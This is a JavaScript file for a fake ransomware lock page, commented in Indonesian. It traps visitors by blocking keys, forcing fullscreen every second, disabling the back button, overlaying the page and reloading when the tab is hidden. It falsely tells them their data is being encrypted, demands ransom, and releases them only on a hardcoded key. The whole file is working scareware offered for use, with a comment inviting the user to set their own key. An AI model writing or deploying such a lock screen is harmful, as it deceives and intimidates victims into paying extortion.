document.addEventListener("keydown", function(event) {
    event.preventDefault(); // Mencegah pengguna keluar dengan tombol keyboard
});

window.addEventListener("beforeunload", function (event) {
    event.returnValue = "⚠️ Your files will be lost if you leave! ⚠️";
});

function checkKey() {
    let key = document.getElementById("keyInput").value;
    let correctKey = "12092010"; // Ganti dengan key yang kamu mau

    if (key === correctKey) {
        alert("✅ System Unlocked!");
        window.location.href = "https://google.com"; // Bisa diarahkan ke mana saja
    } else {
        alert("❌ WRONG KEY! Your system is still locked!");
    }
}

// Aktifkan Fullscreen saat halaman dimuat
document.addEventListener("DOMContentLoaded", function() {
    if (document.documentElement.requestFullscreen) {
        document.documentElement.requestFullscreen();
    }
});

// Blokir tombol kembali
history.pushState(null, null, location.href);
window.onpopstate = function () {
    history.pushState(null, null, location.href);
    alert("Tidak bisa kembali! Tebusan dulu!");
};

// Cegah menutup tab
window.onbeforeunload = function () {
    return "Data Anda sedang dienkripsi! Yakin ingin keluar?";
};

// Paksa Fullscreen jika keluar
function forceFullscreen() {
    if (document.fullscreenElement === null) {
        document.documentElement.requestFullscreen();
    }
}
setInterval(forceFullscreen, 1000);

// Blokir semua gesture keluar dengan overlay transparan
let overlay = document.createElement("div");
overlay.style.position = "fixed";
overlay.style.top = "0";
overlay.style.left = "0";
overlay.style.width = "100%";
overlay.style.height = "100%";
overlay.style.zIndex = "9999";
overlay.style.background = "rgba(0,0,0,0)";
document.body.appendChild(overlay);

// Cegah refresh atau pindah tab dengan loop peringatan
document.addEventListener("visibilitychange", function() {
    if (document.hidden) {
        alert("Jangan coba-coba kabur!");
        location.reload();
    }
});
